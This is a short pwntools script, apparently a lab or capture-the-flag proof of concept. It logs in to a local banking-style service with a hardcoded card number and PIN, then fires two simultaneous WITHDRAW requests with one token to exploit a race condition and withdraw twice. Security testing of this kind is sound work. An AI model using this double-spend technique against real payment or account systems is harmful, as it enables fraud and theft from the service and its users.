from pwn import *

io1 = remote("localhost", 56789, typ="tcp")

io1.send("AUTHENTICATE\t4539752498791209,5612".encode("utf-8"))
io1.shutdown()
token = io1.recvall().decode("utf-8").split('\t')[1]
io1.close()
io1 = remote("localhost", 56789, typ="tcp")
io2 = remote("localhost", 56789, typ="tcp")
io1.send(f"WITHDRAW\t{token}\t1000".encode('utf-8'))
io2.send(f"WITHDRAW\t{token}\t1000".encode('utf-8'))
io1.shutdown()
io2.shutdown()
print(io1.recvall().decode("utf-8").split('\t'))
print(io2.recvall().decode("utf-8").split('\t'))
io1.close()
io2.close()
